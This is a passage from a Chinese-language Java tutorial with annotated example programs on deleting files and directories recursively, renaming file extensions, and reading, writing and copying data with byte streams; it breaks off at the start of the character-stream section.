File类的删除功能</h3><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>boolean delete()</code></td><td>删除文件或（空）目录</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  File类的删除功能</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><span class="hljs-comment">//        File file = new File(&quot;./a.txt&quot;);//构造一个不存在的文件对象</span><br><span class="hljs-comment">//        File file = new File(&quot;./myTest.txt&quot;);//构造一个存在的文件</span><br><span class="hljs-comment">//        File file = new File(&quot;./myDir&quot;);//构造一个存在的空目录</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;./H&quot;</span>);<span class="hljs-comment">//构造了一个多级目录的</span><br><br>        <span class="hljs-comment">//删除文件之前需要先判断文件是否存在</span><br>        <span class="hljs-keyword">if</span>(file.exists())&#123;<br>            <span class="hljs-keyword">if</span> (file.delete())&#123;<br>                System.out.println(file.getName() + <span class="hljs-string">&quot;删除成功！&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                System.out.println(file.getName() + <span class="hljs-string">&quot;删除失败！&quot;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            System.out.println(file.getName() + <span class="hljs-string">&quot;不存在！&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="a8793ac6"></a></p><h3 id="1-6-目录的递归删除"><a href="#1-6-目录的递归删除" class="headerlink" title="1.6 - 目录的递归删除"></a>1.6 - 目录的递归删除</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  目录的递归删除</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo06</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SRC</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;./H&quot;</span>;<span class="hljs-comment">//被删除的目录存储成常量</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(SRC);<span class="hljs-comment">//构造File对象，与H目录相关联</span><br>        delDir(file);<span class="hljs-comment">//调用方法删除H多级目录</span><br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 递归删除目录</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> file 要删除的File对象</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">delDir</span><span class="hljs-params">(File file)</span> &#123;<span class="hljs-comment">//H</span><br>        <span class="hljs-comment">//获取当前目录中的文件列表</span><br>        File[] files = file.listFiles();<br>        <span class="hljs-comment">//判断数组的长度，可以直到目录中是否有内容，如果没有则直接删除</span><br>        <span class="hljs-keyword">if</span>(files.length &gt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//有内容，则遍历内部文件对象</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; files.length; i++) &#123;<br>                <span class="hljs-keyword">if</span>(files[i].isDirectory())&#123;<span class="hljs-comment">//遍历文件中的对象，并判断是否是目录</span><br>                    delDir(files[i]);<span class="hljs-comment">//如果是目录，需要在调用递归，打开并查看目录</span><br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    files[i].delete();<span class="hljs-comment">//如果是文件可以直接删除文件</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        file.delete();<span class="hljs-comment">//如果没有内容则之间删除目录即可</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="340f0d5f"></a></p><h3 id="1-7-修改文件后缀名"><a href="#1-7-修改文件后缀名" class="headerlink" title="1.7 - 修改文件后缀名"></a>1.7 - 修改文件后缀名</h3><ul><li>将指定目录下的所有文件后缀名为txt统一修改成md为结尾的文件。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO 将指定目录下的所有文件后缀名为txt统一修改成md为结尾的文件</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo07</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;./dir&quot;</span>);<span class="hljs-comment">//构造file对象与dir目录相关联</span><br>        renameFile(file);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">renameFile</span><span class="hljs-params">(File file)</span> &#123;<br>        <span class="hljs-keyword">if</span>(file.exists())&#123;<span class="hljs-comment">//判断file对象指向的目录是否存在</span><br>            <span class="hljs-comment">//取出dir目录中的所有内容，一file对象形式返回</span><br>            File[] files = file.listFiles();<br>            <span class="hljs-keyword">for</span> (File f : files) &#123;<span class="hljs-comment">//遍历数组中的文件</span><br>                <span class="hljs-keyword">if</span>(f.isFile())&#123;<span class="hljs-comment">//判断是否是文件</span><br>                    <span class="hljs-keyword">if</span>(f.getName().endsWith(<span class="hljs-string">&quot;txt&quot;</span>))&#123;<span class="hljs-comment">//判断文件名是否以txt为结尾</span><br>                        <span class="hljs-type">String</span> <span class="hljs-variable">parent</span> <span class="hljs-operator">=</span> f.getParent();<span class="hljs-comment">//当前文件所在的目录名</span><br>                        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> f.getName();<span class="hljs-comment">//获取当前文件名</span><br><br>                        <span class="hljs-comment">//修改文件后缀名  name  abc.txt</span><br>                        <span class="hljs-type">String</span> <span class="hljs-variable">newName</span> <span class="hljs-operator">=</span> name.substring(<span class="hljs-number">0</span>, name.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>)) + <span class="hljs-string">&quot;.md&quot;</span>;<br>                        <span class="hljs-type">File</span> <span class="hljs-variable">file1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(parent, newName);<span class="hljs-comment">//将新的文件名构造成file对象</span><br>                        f.renameTo(file1);<span class="hljs-comment">//使用renameTo方式实现文件重命名</span><br>                    &#125;<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    renameFile(f);<span class="hljs-comment">//如果是目录就递归调用自己</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>思考题</strong></p><p>递归实现查看指定目录中的所有文件以及目录的绝对路径</p><p><a name="bd216a7c"></a></p><h2 id="2-I-O字节流"><a href="#2-I-O字节流" class="headerlink" title="2 - I&#x2F;O字节流"></a>2 - I&#x2F;O字节流</h2><p><a name="f81c8f28"></a></p><h3 id="2-1-I-O分类"><a href="#2-1-I-O分类" class="headerlink" title="2.1 - I&#x2F;O分类"></a>2.1 - I&#x2F;O分类</h3><blockquote><p>I&#x2F;O : Input(输入)  &#x2F;  Output(输出)</p></blockquote><blockquote><p>流：是一种抽象的概念，表示数据传输的总称，就是说数据在设备之间的传输称之为流，流的本质就是传输</p></blockquote><ul><li><p>根据数据的流向</p><ul><li>输入流：读数据</li><li>输出流：写数据</li></ul></li></ul><blockquote><p>站在内存的角度，以内存为基准去理解</p></blockquote><ul><li><p>根据数据类型</p><ul><li><p>字节流（万能流）：所有通过文本编译器打开之后看不懂的都是字节流</p><ul><li>字节输入流</li><li>字节输出流</li></ul></li><li><p>字符流：通过文本编译器打开之后能看懂的都是字符流</p><ul><li>字符输入流</li><li>字符输出流</li></ul></li></ul></li></ul><p><a name="b1091661"></a></p><h3 id="2-2-字节流写数据"><a href="#2-2-字节流写数据" class="headerlink" title="2.2 - 字节流写数据"></a>2.2 - 字节流写数据</h3><ul><li><code>OutputStream</code> - 字节输出流</li></ul><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>FileOutputStream(String name)</code></td><td>根据参数指定的路径来构造对象并关联起来</td></tr><tr><td><code>FileOutputStream(String name,boolean append)</code></td><td>以追加的方式构造对象</td></tr><tr><td><code>void write(int b)</code></td><td>用于将参数指定的单个字节写入到输出流中</td></tr><tr><td><code>void write(byte[] bytes)</code></td><td>用于将参数指定的字节数组内容全部写入到输出流中</td></tr><tr><td><code>void write(byte[] bytes, int off , int len)</code></td><td>用于将数组中的一部分内容写入到输出流中</td></tr><tr><td><code>void close()</code></td><td>关闭流并释放资源</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  字节流写数据</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./myTest.txt&quot;</span>);<span class="hljs-comment">//构造字节输出流对象,覆盖写</span><br><span class="hljs-comment">//        FileOutputStream fos = new FileOutputStream(&quot;./myTest.txt&quot;,true);//构造字节输出流对象,追加写</span><br><br>        <span class="hljs-comment">//一次写一个字节，通过字符编码写入文件</span><br><span class="hljs-comment">//        fos.write(65);</span><br><span class="hljs-comment">//        fos.write(66);</span><br>        <span class="hljs-comment">//将26个英文字母写入到文件中</span><br><span class="hljs-comment">//        for (int i = 0; i &lt; 26; i++) &#123;</span><br><span class="hljs-comment">//            fos.write(65 + i);</span><br><span class="hljs-comment">//        &#125;</span><br><br>        <span class="hljs-comment">//写整个byte数组</span><br><span class="hljs-comment">//        byte[] bytes = &#123;97,98,99,100,101,102,103&#125;;</span><br><span class="hljs-comment">//        fos.write(bytes);</span><br><br>        <span class="hljs-comment">//写byte数组中的一部分内容</span><br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-string">&quot;123456789腾讯&quot;</span>.getBytes();<br>        <span class="hljs-comment">//参数二：表示起始位置，参数三：表示写多长的数据</span><br>        fos.write(bytes,<span class="hljs-number">5</span>,<span class="hljs-number">7</span>);<br>        fos.close();<span class="hljs-comment">//关闭流</span><br><br>        <span class="hljs-comment">//在不同的编码格式下，中文占用的字节数是不同的</span><br>        <span class="hljs-comment">//在UTF-8编码格式下，一个中文使用3个字节来表示</span><br>        <span class="hljs-comment">//在GBK编码格式下，一个中文使用2个字节来表示</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="a0e88b4a"></a></p><h3 id="2-3-字节流异常处理"><a href="#2-3-字节流异常处理" class="headerlink" title="2.3 - 字节流异常处理"></a>2.3 - 字节流异常处理</h3><ul><li>抛出去  或者  try、catch</li><li>通过finally 来 close</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO   字节流异常处理</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo03</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<span class="hljs-comment">//构造字节输出流对象,覆盖写</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            fos = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./myTest.txt&quot;</span>);<br>            <span class="hljs-comment">//写byte数组中的一部分内容</span><br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-string">&quot;123456789腾讯&quot;</span>.getBytes();<br>            <span class="hljs-comment">//参数二：表示起始位置，参数三：表示写多长的数据</span><br>            fos.write(bytes,<span class="hljs-number">5</span>,<span class="hljs-number">7</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                fos.close();<span class="hljs-comment">//关闭流</span><br>            &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="66bf7403"></a></p><h3 id="2-4-字节流读数据"><a href="#2-4-字节流读数据" class="headerlink" title="2.4 - 字节流读数据"></a>2.4 - 字节流读数据</h3><ul><li><code>InputStream</code> - 字节输入流</li></ul><table><thead><tr><th>方法名</th><th>说明</th></tr></thead><tbody><tr><td><code>FileInputStream(File file)</code></td><td>根据参数指定的File对象来构造字节输入流对象</td></tr><tr><td><code>FileInputStream(String name)</code></td><td>根据参数指定的字符串来构造字节输入流对象</td></tr><tr><td><code>int read()</code></td><td>用于从输入流中读取单个的字节数据</td></tr><tr><td><code>int read(byte[] bytes)</code></td><td>用于从输入流中读取数组长度个字节数组</td></tr><tr><td><code>int read(byte[] bytes , int off ,int len)</code></td><td>用于从输入流中读取数组中一部分内容</td></tr><tr><td><code>void close()</code></td><td>关闭流并释放资源</td></tr></tbody></table><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  字输入流读数据</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./myTest.txt&quot;</span>);<span class="hljs-comment">//创建字节输入流对象</span><br><br>        <span class="hljs-comment">//一次读取一个字节，返回的是字符编码</span><br><span class="hljs-comment">//        int by = fis.read();</span><br><span class="hljs-comment">//        //如果读到了-1 ，说明文件中有效的内容已经读完了。</span><br><span class="hljs-comment">//        System.out.println((char) by);</span><br><br>        <span class="hljs-comment">//循环的方式读取单个字节</span><br><span class="hljs-comment">//        int by;//用来存储字符编码</span><br><span class="hljs-comment">//        while ((by = fis.read()) != -1)&#123;//如果没有数据可读了，则会返回-1</span><br><span class="hljs-comment">//            System.out.println((char)by);</span><br><span class="hljs-comment">//        &#125;</span><br><br>        <span class="hljs-comment">//一次读取一个数组</span><br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<span class="hljs-comment">//创建一个数组来存储读取到的数据</span><br>        <span class="hljs-type">int</span> len;<span class="hljs-comment">//用来存储读取到的数据的实际长度</span><br><span class="hljs-comment">//        len = fis.read(bytes);</span><br><span class="hljs-comment">//        //将byte数组转换成字符串并打印输出</span><br><span class="hljs-comment">//        System.out.println(new String(bytes,0,len));</span><br><br>        <span class="hljs-comment">//循环的方式一次读取一个数组</span><br>        <span class="hljs-keyword">while</span> ((len = fis.read(bytes)) != -<span class="hljs-number">1</span>)&#123;<br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes,<span class="hljs-number">0</span>,len));<br>        &#125;<br><br>        fis.close();<span class="hljs-comment">//关闭流并释放资源</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>字节流一次读写一个字节</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  字节流一次读写一个字节</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//创建字节输入/输出流对象</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./myTest.txt&quot;</span>);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./newTest.txt&quot;</span>);<br><br>        <span class="hljs-comment">//读写操作</span><br>        <span class="hljs-type">int</span> by;<span class="hljs-comment">//存储字符编码</span><br>        <span class="hljs-keyword">while</span> ((by = fis.read()) != -<span class="hljs-number">1</span>)&#123;<span class="hljs-comment">//第一个字节</span><br>            fos.write(by);<span class="hljs-comment">//通过输出流写到关联的文件中</span><br>        &#125;<br><br>        <span class="hljs-comment">//关闭流</span><br>        fis.close();<br>        fos.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>复制图片</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> ly_smith</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span> #TODO  复制图片</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo06</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//创建字节输入输出流对象</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;./pic.png&quot;</span>);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;./newPic.png&quot;</span>);<br><br>        <span class="hljs-comment">//使用单个字节来赋值图片</span><br><span class="hljs-comment">//        int by;</span><br><span class="hljs-comment">//        while ((by = fis.read()) != -1)&#123;//读一个字节</span><br><span class="hljs-comment">//            fos.write(by);//写一个字节</span><br><span class="hljs-comment">//        &#125;</span><br><br>        <span class="hljs-comment">//使用一次读写一个数组</span><br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<span class="hljs-comment">//计算机中的单位进制位是1024</span><br>        <span class="hljs-type">int</span> len;<span class="hljs-comment">//用来存储数组中读取到的实际数据的长度</span><br>        <span class="hljs-keyword">while</span> ((len = fis.read(bytes)) != -<span class="hljs-number">1</span>)&#123;<span class="hljs-comment">//读一个数组</span><br>            fos.write(bytes,<span class="hljs-number">0</span>,len);<span class="hljs-comment">//写一个数组</span><br>        &#125;<br><br>        <span class="hljs-comment">//关闭流</span><br>        fis.close();<br>        fos.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><a name="5dbe036b"></a></p><h2 id="3-I-O字符流"><a href="#3-I-O字符流" class="headerlink" title="3 - I&#x2F;O字符流"></a>3 - I&#x2F;O字符流</h2><p><a name="3c1b07bb"></a></p><h3 id="3-1-字符输出流写数据"><a href="#3-1-字符输出流写数据" class="headerlink" title="3.1 - 字符输出流写数据"></a>3.1 - 字符输出流写数据</h3><ul><li>OutputStreamWriter&#96;</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> 